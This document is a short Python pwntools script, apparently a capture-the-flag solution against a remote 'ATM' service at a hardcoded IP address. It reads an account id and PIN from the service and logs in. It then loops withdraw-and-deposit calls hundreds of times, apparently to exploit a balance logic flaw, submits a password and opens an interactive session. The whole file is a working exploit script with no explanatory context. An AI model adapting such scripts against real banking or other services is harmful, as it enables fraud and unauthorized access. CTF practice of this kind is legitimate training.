import pwn
from pwn import *


def pop(p: pwn.process, val):
    p.sendline(b"1")
    p.sendline(str(val).encode("utf-8"))


def push(p: pwn.process, val):
    p.sendline(b"2")
    p.sendline(str(val).encode("utf-8"))


if __name__ == '__main__':
    p = remote("51.250.81.57", "8082")
    p.recvuntil(b"r - ")
    id = p.recvline()
    p.recvuntil(b"N - ")
    pin = p.recvline()
    p.sendline(b"2")
    p.sendline(id)
    p.sendline(pin)
    tim = process("atm")
    passwd = tim.recvline()
    print((500 * 20000) // 1000000)
    for i in range((500 * 20000) // 1000000):
        pop(p, 1000000)
        push(p, 1000000)
        # p.clean()
    print((500 * 10000) // 10000)
    for i in range(500):
        pop(p, 10000)
        push(p, 10000)
        if i % 50 == 0:
            p.clean(0.01)
    for i in range(500):
        pop(p, 5000)
        push(p, 5000)
        if i % 50 == 0:
            p.clean(0.01)
    for i in range(499):
        pop(p, 2000)
        push(p, 2000)
        if i % 50 == 0:
            p.clean(0.01)
    p.sendline("5")
    p.sendline(passwd)
    print(p.recvall(1).decode("utf-8"))
    print("aaaa")
    p.interactive()
